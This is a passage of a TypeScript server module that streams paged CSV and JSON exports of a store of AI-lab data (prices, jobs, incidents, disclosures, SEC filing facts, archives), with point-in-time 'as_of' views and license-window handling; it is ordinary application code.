// Bulk exports of the store: every table, as CSV or JSON, streamed in pages
// so a 100k-row changes table never has to fit in Worker memory at once.
//
// The entity views (prices_latest, jobs_open, incidents, revenue_facts) flatten the JSON payload
// into columns, because a CSV with a JSON blob in one cell is not a
// spreadsheet anyone can sort. Provenance columns are always present and
// always last: source_url and fetched_at on every table except source_runs,
// which has no fetched_at by design (a failed run fetched nothing) and
// carries started_at instead.
//
// The CSV defuses cells a spreadsheet would execute (see defuseFormula); the
// JSON is verbatim, because nothing executes a JSON string.
//
// The data license is split by age (shared/utils/license.ts), so a bulk export
// of a table that grows over time serves the trailing window by default and
// every row behind `?history=full`, each row then labeled in a `license`
// column. EXPORT_HISTORY classifies every table and names the date it is cut on.
//
// `?as_of=` (ExportTable.at) serves a table as the store held it at that instant:
// an append-only table by the column that says when each row was written,
// read as a range on the index its keyset already pages; an entity view
// rebuilt from the change log (terminal-asof.ts); and a table rewritten in
// place with no log refused with a 400, since its past is gone.
//
// Pure functions of the Drizzle client, so layers/terminal/test/terminal-export.test.ts can
// drive them against the workerd D1 and read the bytes back.

import { and, asc, count, eq, gte, lt, lte, sql, type SQL } from 'drizzle-orm'
import type { SQLiteColumn, SQLiteTable } from 'drizzle-orm/sqlite-core'

import * as tables from '#server/db/schema'
import {
  DATA_LICENSE,
  HISTORY_LICENSE,
  HISTORY_PARAM,
  LICENSE_SPLIT_EFFECTIVE,
  LICENSE_WINDOW_DAYS,
  licenseWindowStart,
  rowLicense,
  type LicenseRef,
} from '#shared/utils/license'
import { riskFactorChanges } from '../pipeline/parsers/sec/prospectus-risk-factors'
import type { PipelineDb } from '../pipeline/store'
import {
  AS_OF_PARAM,
  PointInTimeError,
  alertsKnownAt,
  judgeCutoffAt,
  parseAsOfQuery,
  rewindEntities,
} from './terminal-asof'
import { ENTITY_SECURITIES, ENTITY_SECURITY_COLUMNS } from './terminal-entities'
import { ENTITY_IDENTIFIERS, ENTITY_IDENTIFIER_COLUMNS } from './terminal-identifiers'
import { buildSeries } from '../exposure/series'
import { filedBefore } from './terminal-exposure'
import { byString } from './terminal-json'

export const EXPORT_PAGE_SIZE = 200

type Row = Record<string, unknown>

export interface ExportTable {
  name: string
  description: string
  columns: readonly string[]
  /**
   * One page of rows in a stable order, already reduced to `columns`: the
   * first page for `after` null, else the rows that follow `after` (the last
   * row of the previous page). Keyset, not OFFSET — an offset page re-reads
   * every row before it, so streaming a table was quadratic in its size.
   */
  page(db: PipelineDb, after: Row | null, limit: number, where?: SQL): Promise<Row[]>
  count(db: PipelineDb): Promise<number>
  /** Query parameters this table can be narrowed by (`?recipe_id=`), each an equality on a column. */
  filters?: Readonly<Record<string, SQLiteColumn>>
  /** The table as the store held it at `at`; throws PointInTimeError when its past is not kept. */
  at(db: PipelineDb, at: string): Promise<ExportTable>
  /** Why `at` refuses, or null when it answers. */
  asOfRefusal: string | null
  /**
   * How `at` answers: `cut` keeps the rows written by T (an append-only table),
   * `rebuilt` replays the change log back to T (a table of current rows),
   * `refused` is asOfRefusal. The data dictionary states it per table.
   */
  pointInTime: PointInTimeMode
}

export type PointInTimeMode = 'cut' | 'rebuilt' | 'refused'

/**
 * The equality filters a request asks for, as one SQL condition. A parameter
 * the table does not declare is an error, never silently ignored: an export
 * that ignores `?recipe_id=` hands back the whole table under a name that
 * says otherwise.
 */
export function exportFilter(
  table: ExportTable,
  query: Record<string, unknown>,
): { where: SQL | undefined } | { error: string } {
  const conditions: SQL[] = []
  for (const [name, raw] of Object.entries(query)) {
    if (name === AS_OF_PARAM) continue // ExportTable.at, not a column filter
    if (name === HISTORY_PARAM) continue // the license window (windowOf), not a column filter
    const column = table.filters?.[name]
    if (!column) {
      const allowed = Object.keys(table.filters ?? {})
      return {
        error: `${table.name} cannot be filtered by ${name}${allowed.length ? `. It accepts ${allowed.join(', ')}` : ''}`,
      }
    }
    if (typeof raw !== 'string' || !/^[\w.@-]{1,100}$/.test(raw)) {
      return { error: `${name} must be one id of letters, digits, '.', '@' or '-'` }
    }
    conditions.push(eq(column, raw))
  }
  return { where: conditions.length ? and(...conditions) : undefined }
}

/** How an append-only table answers `as_of`: the rows written by `at`. */
type WrittenBy = (db: PipelineDb, at: string) => Promise<SQL | undefined>

/** A unique sort key: the columns a keyset page orders by and resumes after. */
type Key = readonly [SQLiteColumn, ...SQLiteColumn[]]

/** Rows strictly after `after` in the order of `key`, as one row-value compare
 * so SQLite can seek the composite index instead of filtering. */
function afterKey(key: Key, after: Row | null): SQL | undefined {
  if (after === null) return undefined
  const columns = sql.join([...key], sql`, `)
  const values = sql.join(
    key.map((c) => sql`${after[c.name]}`),
    sql`, `,
  )
  return sql`(${columns}) > (${values})`
}

const PROVENANCE = ['source_url', 'fetched_at'] as const

const PRICE_FIELDS = [
  'model_slug',
  'tier',
  'context_window',
  'input_per_mtok',
  'cached_input_per_mtok',
  'output_per_mtok',
  'currency',
  'effective_from',
  'effective_until',
  'notes',
] as const

const REVENUE_FIELDS = [
  'cik',
  'entity_name',
  'taxonomy',
  'tag',
  'unit',
  'start',
  'end',
  'val',
  'accession_no',
  'fy',
  'fp',
  'form',
  'filed',
  'frame',
  'whitelist_cik',
] as const

const JOB_FIELDS = [
  'job_id',
  'title',
  'department',
  'team',
  'location',
  'employment_type',
  'published_at',
  'updated_at',
  'company_name',
] as const

const INCIDENT_FIELDS = [
  'incident_id',
  'title',
  'impact',
  'status',
  'started_at',
  'resolved_at',
  'components',
  'incident_url',
] as const

const DISCLOSURE_FIELDS = [
  'kind',
  'entry_id',
  'title',
  'summary',
  'model',
  'observed_during',
  'listed_on',
  'entry_url',
] as const

const DISCLOSURE_TIMELINE_FIELDS = [
  'entry_id',
  'title',
  'lines',
  'discovered_on',
  'disclosed_on',
] as const

function parsePayload(text: string): Row {
  try {
    const value = JSON.parse(text) as unknown
    return typeof value === 'object' && value !== null && !Array.isArray(value)
      ? (value as Row)
      : {}
  } catch {
    return {}
  }
}

/** Keep only `columns`, in order, with null for anything the row lacks. */
function project(row: Row, columns: readonly string[]): Row {
  const out: Row = {}
  for (const column of columns) out[column] = row[column] ?? null
  return out
}

function entityView(
  name: string,
  description: string,
  entityType:
    | 'model'
    | 'job'
    | 'incident'
    | 'ranking'
    | 'revenue'
    | 'filer'
    | 'disclosure'
    | 'disclosure_timeline',
  fields: readonly string[],
): ExportTable {
  const columns = [
    'entity_key',
    'source_id',
    'provider',
    ...fields,
    'content_hash',
    'snapshot_id',
    'first_seen_at',
    ...PROVENANCE,
  ]
  const ofType = eq(tables.entities.entity_type, entityType)
  const key = [tables.entities.source_id, tables.entities.entity_key] as const
  return {
    name,
    description,
    columns,
    async at(db, at) {
      // The current set is the view; as of T it is rebuilt in memory (one
      // type's rows and change log) and paged by the same keyset.
      const rewound = await rewindEntities(db, entityType, at)
      const unverified = new Set(rewound.unverified)
      const columnsAt = [...columns.slice(0, -2), 'as_of_verified', ...PROVENANCE]
      const rows = rewound.rows.map(({ payload, ...rest }) =>
        project(
          {
            ...parsePayload(payload),
            ...rest,
            as_of_verified: !unverified.has(rest.entity_key),
          },
          columnsAt,
        ),
      )
      const keyOf = (r: Row) => [String(r.source_id), String(r.entity_key)] as const
      return {
        name,
        description,
        columns: columnsAt,
        async page(_db, after, limit) {
          if (after === null) return rows.slice(0, limit)
          const [s, k] = keyOf(after)
          const from = rows.findIndex((r) => {
            const [rs, rk] = keyOf(r)
            return byString(rs, s) > 0 || (rs === s && byString(rk, k) > 0)
          })
          return from === -1 ? [] : rows.slice(from, from + limit)
        },
        count: async () => rows.length,
        at: () => Promise.reject(new PointInTimeError('already a point-in-time view')),
        asOfRefusal: null,
        pointInTime: 'rebuilt',
      }
    },
    asOfRefusal: null,
    pointInTime: 'rebuilt',
    async page(db, after, limit) {
      const rows = await db
        .select()
        .from(tables.entities)
        .where(and(ofType, afterKey(key, after)))
        .orderBy(...key.map((c) => asc(c)))
        .limit(limit)
      return rows.map(({ payload, ...rest }) =>
        project({ ...parsePayload(payload), ...rest }, columns),
      )
    },
    async count(db) {
      const [row] = await db.select({ total: count() }).from(tables.entities).where(ofType)
      return row?.total ?? 0
    },
  }
}

/**
 * An entity view with one output row per part of a payload — a statement's
 * lines, a schedule's buckets, a filing's headings. The keyset is the entity's
 * (source_id, entity_key) plus the part's ordinal, so a page can end inside an
 * entity. `prepare` reads anything the parts are computed against (an earlier
 * filing's headings) once per page.
 */
function partsView<C>(
  name: string,
  description: string,
  entityType: 'statement' | 'commitment' | 'concentration' | 'shares' | 'risk_factors',
  fields: readonly string[],
  explode: (payload: Row, context: C) => Row[],
  prepare: (db: PipelineDb) => Promise<C>,
): ExportTable {
  const columns = [
    'entity_key',
    'source_id',
    'provider',
    'part',
    ...fields,
    'first_seen_at',
    ...PROVENANCE,
  ]
  const ofType = eq(tables.entities.entity_type, entityType)
  const { source_id, entity_key } = tables.entities
  const at = (after: Row, strict: boolean) =>
    strict
      ? sql`(${source_id}, ${entity_key}) > (${after.source_id}, ${after.entity_key})`
      : sql`(${source_id}, ${entity_key}) >= (${after.source_id}, ${after.entity_key})`
  return {
    name,
    description,
    columns,
    async page(db, after, limit) {
      const context = await prepare(db)
      const out: Row[] = []
      let cursor: { row: Row; strict: boolean } | null = after
        ? { row: after, strict: false }
        : null
      for (;;) {
        const rows = await db
          .select()
          .from(tables.entities)
          .where(and(ofType, cursor ? at(cursor.row, cursor.strict) : undefined))
          .orderBy(asc(source_id), asc(entity_key))
          .limit(limit)
        for (const { payload, ...rest } of rows) {
          const resumes =
            after !== null &&
            rest.source_id === after.source_id &&
            rest.entity_key === after.entity_key
          explode(parsePayload(payload), context).forEach((part, i) => {
            if (resumes && i <= Number(after.part)) return
            out.push(project({ ...part, ...rest, part: i }, columns))
          })
          if (out.length >= limit) return out.slice(0, limit)
        }
        if (rows.length < limit) return out
        cursor = { row: rows.at(-1)!, strict: true }
      }
    },
    async count(db) {
      const context = await prepare(db)
      const rows = await db
        .select({ payload: tables.entities.payload })
        .from(tables.entities)
        .where(ofType)
      return rows.reduce((n, r) => n + explode(parsePayload(r.payload), context).length, 0)
    },
    // #142 (as_of) and #144 (these views) merged in parallel; rewinding an
    // exploded view through the change log is not built, so it says so.
    at: () => Promise.reject(new PointInTimeError(PARTS_AS_OF_REFUSAL)),
    asOfRefusal: PARTS_AS_OF_REFUSAL,
    pointInTime: 'refused',
  }
}

const PARTS_AS_OF_REFUSAL =
  'this view is built from the current filing rows, and we can’t rebuild its past versions yet.'

const FILING_FIELDS = ['cik', 'entity_name', 'accession_no', 'form', 'filed'] as const
const filing = (p: Row): Row => Object.fromEntries(FILING_FIELDS.map((f) => [f, p[f] ?? null]))
const list = (v: unknown): Row[] => (Array.isArray(v) ? (v as Row[]) : [])
const none = async () => null

/** Per filing, the previous filing's risk-factor headings by the same filer. */
async function priorHeadings(db: PipelineDb): Promise<Map<string, Row>> {
  const rows = await db
    .select({ payload: tables.entities.payload })
    .from(tables.entities)
    .where(eq(tables.entities.entity_type, 'risk_factors'))
  const filings = rows
    .map((r) => parsePayload(r.payload))
    .sort((a, b) =>
      `${a.cik}${a.filed}${a.accession_no}` < `${b.cik}${b.filed}${b.accession_no}` ? -1 : 1,
    )
  const prior = new Map<string, Row>()
  filings.forEach((f, i) => {
    const before = filings[i - 1]
    if (before && before.cik === f.cik) prior.set(String(f.accession_no), before)
  })
  return prior
}

type Sections = { title: string; headings: string[] }[]

function plainTable(
  name: string,
  description: string,
  table: SQLiteTable,
  columns: readonly string[],
  key: Key,
  writtenBy: WrittenBy | string,
  total?: SQL<number>,
  filters?: Readonly<Record<string, SQLiteColumn>>,
  /** Rows this export never serves, whatever the request asks for. */
  scope?: SQL,
): ExportTable {
  const pageWhere =
    (filter: SQL | undefined) =>
    async (db: PipelineDb, after: Row | null, limit: number, where?: SQL) => {
      const rows = await db
        .select()
        .from(table)
        .where(and(filter, afterKey(key, after), where, scope))
        .orderBy(...key.map((c) => asc(c)))
        .limit(limit)
      return rows.map((row) => project(row as Row, columns))
    }
  return {
    name,
    description,
    columns,
    filters,
    page: pageWhere(undefined),
    async at(db, at) {
      if (typeof writtenBy === 'string') throw new PointInTimeError(writtenBy)
      const filter = await writtenBy(db, at)
      return {
        name,
        description,
        columns,
        filters,
        page: pageWhere(filter),
        // A count up to T would read every row up to T; nothing asks for it.
        count: () => Promise.reject(new Error('not counted as of T')),
        at: () => Promise.reject(new PointInTimeError('already a point-in-time view')),
        asOfRefusal: null,
        pointInTime: 'cut',
      }
    },
    asOfRefusal: typeof writtenBy === 'string' ? writtenBy : null,
    pointInTime: typeof writtenBy === 'string' ? 'refused' : 'cut',
    async count(db) {
      if (total) {
        const [row] = await db.select({ total }).from(tables.sourceStats)
        return Number(row?.total ?? 0)
      }
      const [row] = await db.select({ total: count() }).from(table).where(scope)
      return row?.total ?? 0
    },
  }
}

/** A table that lives in code, not D1: a few hand-checked rows, each with its own source. */
function staticTable(
  name: string,
  description: string,
  columns: readonly string[],
  rows: readonly object[],
  asOfRefusal: string,
): ExportTable {
  return {
    name,
    description,
    columns,
    async page(_db, after) {
      return after === null ? rows.map((row) => project(row as Row, columns)) : []
    },
    async count() {
      return rows.length
    },
    at: () => Promise.reject(new PointInTimeError(asOfRefusal)),
    asOfRefusal,
    pointInTime: 'refused',
  }
}

const EXPOSURE_COLUMNS = [
  'series_id',
  'ticker',
  'filer',
  'group',
  'label',
  'concept',
  'dims',
  'kind',
  'unit',
  'start',
  'end',
  'value',
  'derived',
  'less_start',
  'less_end',
  'less_value',
  'less_accession_no',
  'accession_no',
  'form',
  'filed',
  'filing_url',
  ...PROVENANCE,
] as const

/**
 * Every exposure series point (layers/terminal/server/exposure/series.ts),
 * built in memory from filed_facts: a few thousand facts at most. As of T it
 * is built from the facts filed before T's UTC day.
 */
function exposureView(name: string, description: string): ExportTable {
  const build = async (db: PipelineDb, at: string | null): Promise<Row[]> => {
    const facts = await db
      .select()
      .from(tables.filedFacts)
      .where(at ? lt(tables.filedFacts.filed, filedBefore(at)) : undefined)
    return buildSeries(facts).flatMap((s) =>
      s.points.map((p) => ({
        series_id: s.id,
        ticker: s.ticker,
        filer: s.filer,
        group: s.group,
        label: s.label,
        concept: s.concept,
        dims: s.dims,
        kind: s.kind,
        unit: s.unit,
        start: p.start,
        end: p.end,
        value: p.value,
        derived: p.derived,
        less_start: p.less?.start ?? null,
        less_end: p.less?.end ?? null,
        less_value: p.less?.value ?? null,
        less_accession_no: p.less?.accession_no ?? null,
        accession_no: p.accession_no,
        form: p.form,
        filed: p.filed,
        filing_url: p.filing_url,
        source_url: p.source_url,
        fetched_at: p.fetched_at,
      })),
    )
  }
  const view = (at: string | null): ExportTable => ({
    name,
    description,
    columns: EXPOSURE_COLUMNS,
    async page(db, after, limit) {
      const rows = await build(db, at)
      const from =
        after === null
          ? 0
          : rows.findIndex((r) => r.series_id === after.series_id && r.end === after.end) + 1
      return rows.slice(from, from + limit)
    },
    count: async (db) => (await build(db, at)).length,
    at: (_db, instant) =>
      at === null
        ? Promise.resolve(view(instant))
        : Promise.reject(new PointInTimeError('already a point-in-time view')),
    asOfRefusal: null,
    pointInTime: 'cut',
  })
  return view(null)
}

/**
 * Tables that were exported and no longer are, with the reason a request for
 * one is told (410, not 404: the URL existed). See docs/source-audit.md.
 */
export const WITHDRAWN_EXPORTS: Readonly<Record<string, string>> = {
  rankings_daily:
    'OpenRouter licenses its rankings CC BY 4.0 but says the dataset "is not intended to be re-served as a competing free API", so we no longer offer the raw per-model daily rows as a download. Per-lab shares and top models are still at /rankings and /api/rankings. You can get the rows from openrouter.ai/api/v1/datasets/rankings-daily with an OpenRouter key.',
}

// OpenRouter's per-model daily rows reach the change log as `ranking` changes
// with the row in before_json/after_json; the changes export leaves them out
// for the same reason rankings_daily is withdrawn.
const notRanking = sql`${tables.changes.entity_type} <> 'ranking'`

// The two tables that gain a row per source per tick are counted from
// source_stats; a count(*) over either reads every row ever written.
const loggedTotal = (column: SQLiteColumn) => sql<number>`coalesce(sum(${column}), 0)`

/** Rows whose own timestamp (the leading keyset column, so an index range) is at or before T. */
const byColumn =
  (column: SQLiteColumn): WrittenBy =>
  async (_db, at) =>
    lte(column, at)

export const EXPORT_TABLES: Readonly<Record<string, ExportTable>> = {
  snapshots: plainTable(
    'snapshots',
    'One row per fetch of every source, with its content hash, HTTP status, byte count, and the R2 key of the raw response.',
    tables.snapshots,
    ['id', 'source_id', 'content_hash', 'raw_key', 'http_status', 'bytes', ...PROVENANCE],
    [tables.snapshots.fetched_at, tables.snapshots.id],
    byColumn(tables.snapshots.fetched_at),
    loggedTotal(tables.sourceStats.snapshot_count),
  ),
  prices_latest: entityView(
    'prices_latest',
    'The current price and catalog row per SKU and source, as each vendor page stated it at our last check.',
    'model',
    PRICE_FIELDS,
  ),
  jobs_open: entityView(
    'jobs_open',
    'Every role currently listed on the job boards we track. A closed role leaves this table and shows up in changes.',
    'job',
    JOB_FIELDS,
  ),
  incidents: entityView(
    'incidents',
    'Every status-page incident we’ve stored, with the vendor’s title, impact, and status verbatim, start and resolution, and components. Impact is null where the feed publishes none (Anthropic’s Atom feed doesn’t). We keep an incident after it drops out of its feed.',
    'incident',
    INCIDENT_FIELDS,
  ),
  disclosures: entityView(
    'disclosures',
    'Every entry on a lab’s own misalignment-disclosure index (only OpenAI publishes one). Each row has the report or notice, title, summary, model, and context verbatim, and the date the index prints beside it. A count measures what a lab disclosed, not how its models behaved.',
    'disclosure',
    DISCLOSURE_FIELDS,
  ),
  disclosure_timelines: entityView(
    'disclosure_timelines',
    'The dates printed on each report’s own page. That’s every “Label: value” line verbatim, the discovery date, and the disclosure date where the page prints one.',
    'disclosure_timeline',
    DISCLOSURE_TIMELINE_FIELDS,
  ),
  filers: entityView(
    'filers',
    'One row per lab whose CIK we found in its own registration filing (sources.yaml pending_filers). Each row has the CIK, EDGAR’s name for the filer, and the filing we read it from.',
    'filer',
    // provider is already a leading column of every entity view; naming it
    // again printed it twice in the CSV header.
    ['cik', 'name', 'resolved_form', 'resolved_accession', 'resolved_file_date'],
  ),
  revenue_facts: entityView(
    'revenue_facts',
    'One row per XBRL revenue fact, with the filer, tag, period, value in USD, and the filing that reported it. Facts come from EDGAR company facts, a filing’s segment XBRL (Google Cloud), and a prospectus’s XBRL. Rows are never edited. A restatement is a new row under its own accession.',
    'revenue',
    REVENUE_FIELDS,
  ),
  prospectus_statements: partsView(
    'prospectus_statements',
    'Every line of the statement of operations in a lab’s own registration filing (S-1, S-1/A). One row per filing, period, and line, with the line verbatim, a standard key where we have one, and the value in USD, shares, or USD per share. Null means the filing printed a dash. Interim periods are unaudited.',
    'statement',
    [...FILING_FIELDS, 'start', 'end', 'unaudited', 'units', 'line_key', 'label', 'val', 'unit'],
    (p) =>
      list(p.lines).map((l) => ({
        ...filing(p),
        start: p.start,
        end: p.end,
        unaudited: p.unaudited === true,
        units: p.units,
        line_key: l.key,
        label: l.label,
        val: l.val,
        unit: l.unit,
      })),
    none,
  ),
  prospectus_commitments: partsView(
    'prospectus_commitments',
    'Contractual commitments printed in a lab’s registration filing. That covers the contractual-obligations table in MD&A (management’s discussion and analysis), the purchase-commitment schedule in the commitments note, and the one-figure totals, as of each date stated. One row per schedule line and year bucket, with bucket “Total” for the line’s total. approximate marks a figure the filing calls approximate, and statement quotes its sentence.',
    'commitment',
    [
      ...FILING_FIELDS,
      'schedule',
      'as_of',
      'audited',
      'approximate',
      'line',
      'bucket',
      'val',
      'statement',
    ],
    (p) =>
      list(p.lines).flatMap((l) =>
        [{ label: 'Total', val: l.total }, ...list(l.buckets)].map((b) => ({
          ...filing(p),
          schedule: p.schedule,
          as_of: p.as_of,
          audited: p.audited,
          approximate: p.approximate,
          line: l.label,
          bucket: b.label,
          val: b.val,
          statement: p.statement,
        })),
      ),
    none,
  ),
  prospectus_concentration: partsView(
    'prospectus_concentration',
    'Customers at or above 10% of revenue or of accounts receivable, from a lab’s registration filing. One row per filing, basis, customer, and period or balance date, with customers named as the filing names them. A null pct is the filing’s “*”, which means under 10% (not zero).',
    'concentration',
    [...FILING_FIELDS, 'basis', 'customer', 'start', 'end', 'unaudited', 'pct'],
    (p) => {
      const columns = list(p.columns)
      return list(p.customers).flatMap((c) =>
        columns.map((col, i) => ({
          ...filing(p),
          basis: p.basis,
          customer: c.label,
          start: col.start,
          end: col.end,
          unaudited: col.unaudited,
          pct: (c.pct as unknown[])[i] ?? null,
        })),
      )
    },
    none,
  ),
  prospectus_shares: partsView(
    'prospectus_shares',
    'Share counts from a lab’s registration filing. Each row of “The Offering” (shares offered, and each class outstanding after the offering, with the underwriters’ option where stated), plus the pre-offering counts it’s based on. Null while the filing leaves a count blank.',
    'shares',
    [...FILING_FIELDS, 'measure', 'as_of', 'label', 'shares', 'with_option'],
    (p) => [
      ...list(p.lines).map((l) => ({
        ...filing(p),
        measure: 'the_offering',
        as_of: null,
        label: l.label,
        shares: l.shares,
        with_option: l.with_option,
      })),
      ...list(p.before).map((l) => ({
        ...filing(p),
        measure: 'before_offering',
        as_of: p.before_as_of,
        label: l.label,
        shares: l.shares,
        with_option: null,
      })),
    ],
    none,
  ),
  prospectus_risk_factors: partsView(
    'prospectus_risk_factors',
    'Every risk-factor heading in a lab’s registration filing, verbatim and in order. Each is compared with the same filer’s previous filing and marked unchanged, added, reworded (previous holds the earlier words), or removed. A removed heading is one the previous filing printed and this one doesn’t, listed after this filing’s own.',
    'risk_factors',
    [...FILING_FIELDS, 'section', 'heading', 'change', 'previous'],
    (p, prior) => {
      const sections = list(p.sections) as unknown as Sections
      const before = prior.get(String(p.accession_no))
      const changes = before
        ? riskFactorChanges(
            { sections: list(before.sections) as unknown as Sections },
            { sections },
          )
        : []
      const of = (heading: string) =>
        changes.find((c) => c.kind !== 'removed' && c.heading === heading)
      return [
        ...sections.flatMap((s) =>
          s.headings.map((heading) => ({
            ...filing(p),
            section: s.title,
            heading,
            change: before ? (of(heading)?.kind ?? 'unchanged') : null,
            previous: of(heading)?.previous ?? null,
          })),
        ),
        ...changes
          .filter((c) => c.kind === 'removed')
          .map((c) => ({
            ...filing(p),
            section: c.section,
            heading: c.heading,
            change: 'removed',
            previous: null,
          })),
      ]
    },
    priorHeadings,
  ),
  changes: plainTable(
    'changes',
    'The change log. Every tracked item added, removed, or modified, with its before and after values. Rows are never edited. OpenRouter ranking rows are left out (see rankings_daily on /data).',
    tables.changes,
    [
      'id',
      'entity_key',
      'entity_type',
      'provider',
      'change_type',
      'before_hash',
      'after_hash',
      'before_json',
      'after_json',
      'detected_at',
      ...PROVENANCE,
    ],
    [tables.changes.detected_at, tables.changes.id],
    byColumn(tables.changes.detected_at),
    undefined,
    undefined,
    notRanking,
  ),
  archived_prices: plainTable(
    'archived_prices',
    'Price history from before we watched the labs: one row per SKU per Internet Archive copy of the lab’s own pricing page that we could read. source_url is the copy, captured_at when the Archive saw the page, fetched_at when we read the copy. Never mixed into the live tables.',
    tables.archivedPrices,
    [
      'id',
      'capture_id',
      'entity_key',
      'provider',
      'content_hash',
      'payload',
      'captured_at',
      'original_url',
      'basis',
      ...PROVENANCE,
    ],
    [tables.archivedPrices.captured_at, tables.archivedPrices.id],
    byColumn(tables.archivedPrices.captured_at),
  ),
  archived_hiring: plainTable(
    'archived_hiring',
    'Hiring history from before we read the labs’ job boards: open roles per Internet Archive copy of each lab’s own board that we could read. One board row per copy, and one row per department when the copy lists every role. source_url is the copy, captured_at when the Archive saw the board, fetched_at when we read the copy. Never mixed into the live tables.',
    tables.archivedHiring,
    [
      'id',
      'capture_id',
      'provider',
      'scope',
      'label',
      'department_id',
      'department',
      'open_roles',
      'captured_at',
      'original_url',
      'basis',
      ...PROVENANCE,
    ],
    [tables.archivedHiring.captured_at, tables.archivedHiring.id],
    byColumn(tables.archivedHiring.captured_at),
  ),
  archive_captures: plainTable(
    'archive_captures',
    'Every Internet Archive copy the price- and hiring-history backfill considered: read (with how many rows it gave) or skipped, with the reason. A skipped copy gave no rows; nothing on it was guessed.',
    tables.archiveCaptures,
    [
      'id',
      'era',
      'provider',
      'original_url',
      'captured_at',
      'status',
      'detail',
      'content_hash',
      'raw_key',
      'bytes',
      'rows',
      'axis',
      ...PROVENANCE,
    ],
    [tables.archiveCaptures.captured_at, tables.archiveCaptures.id],
    byColumn(tables.archiveCaptures.captured_at),
  ),
  alerts: plainTable(
    'alerts',
    'Every alert fired, with the change ids it cites and the rule that produced it.',
    tables.alerts,
    [
      'id',
      'severity',
      'headline',
      'explanation',
      'change_ids',
      'rule',
      'created_at',
      ...PROVENANCE,
    ],
    [tables.alerts.created_at, tables.alerts.id],
    async (db, at) => alertsKnownAt(at, await judgeCutoffAt(db, at)),
  ),
  claim_readings: plainTable(
    'claim_readings',
    'One row per thesis claim and data date: the measured value its kill condition is checked against, with the detail behind it (docs/theses/).',
    tables.claimReadings,
    ['thesis_id', 'claim_id', 'date', 'value', 'detail', 'computed_at', ...PROVENANCE],
    [tables.claimReadings.claim_id, tables.claimReadings.date],
    'a claim reading is rewritten in place while its data is revised, and the value it replaced is not kept.',
  ),
  claim_verdicts: plainTable(
    'claim_verdicts',
    'The judge’s verdict on each candidate event for a judged thesis claim, with its rationale and the facts we computed (a price cut’s size, an outage’s hours). Rows are never edited.',
    tables.claimVerdicts,
    [
      'id',
      'thesis_id',
      'claim_id',
      'subject',
      'change_id',
      'provider',
      'verdict',
      'rationale',
      'facts',
      'detected_at',
      'judged_at',
      ...PROVENANCE,
    ],
    [tables.claimVerdicts.detected_at, tables.claimVerdicts.id],
    // Judged after the change it rates; held back until it was judged.
    async (_db, at) =>
      and(lte(tables.claimVerdicts.detected_at, at), lte(tables.claimVerdicts.judged_at, at)),
  ),
  track_record_candidates: plainTable(
    'track_record_candidates',
    'Press articles (from GDELT) and lab newsroom posts found within 7 days either side of when we saw a notable or critical alert’s change. A candidate isn’t a match. track_record_verdicts says which ones report the same event. Rows are never edited.',
    tables.trackRecordCandidates,
    [
      'id',
      'alert_id',
      'kind',
      'title',
      'snippet',
      'outlet',
      'url',
      'published_at',
      'search_id',
      'found_at',
      ...PROVENANCE,
    ],
    [tables.trackRecordCandidates.found_at, tables.trackRecordCandidates.id],
    byColumn(tables.trackRecordCandidates.found_at),
    undefined,
    { alert_id: tables.trackRecordCandidates.alert_id },
  ),
  track_record_verdicts: plainTable(
    'track_record_verdicts',
    'The judge’s rating of each track-record candidate: whether it reports the alert’s own event, with a rationale grounded in the headline and the alert’s change rows. Rows are never edited.',
    tables.trackRecordVerdicts,
    ['id', 'candidate_id', 'alert_id', 'same_event', 'rationale', 'judged_at', ...PROVENANCE],
    [tables.trackRecordVerdicts.judged_at, tables.trackRecordVerdicts.id],
    byColumn(tables.trackRecordVerdicts.judged_at),
    undefined,
    { alert_id: tables.trackRecordVerdicts.alert_id },
  ),
  reported_articles: plainTable(
    'reported_articles',
    'News articles (from GDELT) whose headline names a private lab we track, an amount of money and a financial word. Syndicated copies of one headline share a title_key. Rows are never edited.',
    tables.reportedArticles,
    [
      'id',
      'title_key',
      'title',
      'outlet',
      'url',
      'published_at',
      'found_at',
      'raw_key',
      ...PROVENANCE,
    ],
    [tables.reportedArticles.found_at, tables.reportedArticles.id],
    byColumn(tables.reportedArticles.found_at),
  ),
  reported_figures: plainTable(
    'reported_figures',
    'Each lab revenue, valuation or funding figure a headline in reported_articles states, as our judge model labeled it. A label is kept only when its amount and lab are in the headline as written. Unaudited press figures, never mixed with filed ones. Rows are never edited.',
    tables.reportedFigures,
    [
      'id',
      'title_key',
      'article_id',
      'lab',
      'metric',
      'basis',
      'currency',
      'amount',
      'amount_text',
      'period',
      'published_at',
      'judged_at',
      ...PROVENANCE,
    ],
    [tables.reportedFigures.judged_at, tables.reportedFigures.id],
    byColumn(tables.reportedFigures.judged_at),
    undefined,
    { lab: tables.reportedFigures.lab },
  ),
  recipe_observations: plainTable(
    'recipe_observations',
    'What each thesis recipe read from its public source (layers/terminal/server/theses/recipes/). One row per recipe, key, and date, with the value, the fields kept beside it, and the R2 key of the raw bytes.',
    tables.recipeObservations,
    [
      'id',
      'recipe_id',
      'company',
      'key',
      'date',
      'value',
      'payload',
      'raw_key',
      'first_seen_at',
      ...PROVENANCE,
    ],
    // id last: (recipe_id, key, date) is not unique, and a keyset needs a key that is.
    [
      tables.recipeObservations.recipe_id,
      tables.recipeObservations.key,
      tables.recipeObservations.date,
      tables.recipeObservations.id,
    ],
    'a recipe observation is rewritten in place when a re-read gives a different value, and the value it replaced is not kept.',
    undefined,
    { recipe_id: tables.recipeObservations.recipe_id },
  ),
  filed_facts: plainTable(
    'filed_facts',
    'Every XBRL fact the exposure series read from Microsoft, Alphabet, Amazon, Meta, and Oracle: capex, finance leases, backlog, and what Microsoft and Amazon tag on OpenAI and Anthropic. One row per fact per filing, so a restated value keeps the row it replaced. Rows are never edited.',
    tables.filedFacts,
    [
      'id',
      'ticker',
      'cik',
      'concept',
      'dims',
      'start',
      'end',
      'value',
      'unit',
      'form',
      'filed',
      'accession_no',
      'basis',
      'raw_key',
      'first_seen_at',
      ...PROVENANCE,
    ],
    [tables.filedFacts.filed, tables.filedFacts.id],
    async (_db, at) => lt(tables.filedFacts.filed, filedBefore(at)),
    undefined,
    { ticker: tables.filedFacts.ticker },
  ),
  exposure_quarters: exposureView(
    'exposure_quarters',
    'The series on /exposure, one row per series and period: quarterly capex, backlog at each period end, and the OpenAI and Anthropic lines, from 2020. Each value is the newest filing’s. A derived quarter is a year-to-date figure less the one a quarter shorter, which the less_ columns name.',
  ),
  source_runs: plainTable(
    'source_runs',
    'One row per check of each source, with what we tried and what happened. There’s no fetched_at column, since a failed run fetched nothing.',
    tables.sourceRuns,
    [
      'id',
      'scope',
      'source_id',
      'started_at',
      'status',
